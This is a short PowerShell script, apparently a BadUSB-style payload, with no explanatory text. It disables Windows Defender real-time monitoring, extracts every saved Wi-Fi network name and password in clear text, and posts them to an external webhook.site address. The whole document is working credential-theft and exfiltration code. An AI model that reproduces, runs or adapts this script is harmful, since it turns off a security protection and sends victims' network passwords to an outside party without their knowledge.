Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
$w = netsh wlan show prof | sls ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()} | %{$n=$_; $k=(netsh wlan show prof name="$n" key=clear | sls 'Key Content\W+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}); if($k){"SSID:$n | Pass:$k"}}
$data = $w | Out-String
if ($data.Trim()) {
    Invoke-RestMethod -Uri "https://webhook.site/3d5fbea1-26d8-419e-b33a-89f160d28fe1" -Method Post -Body $data -UseBasicParsing
}
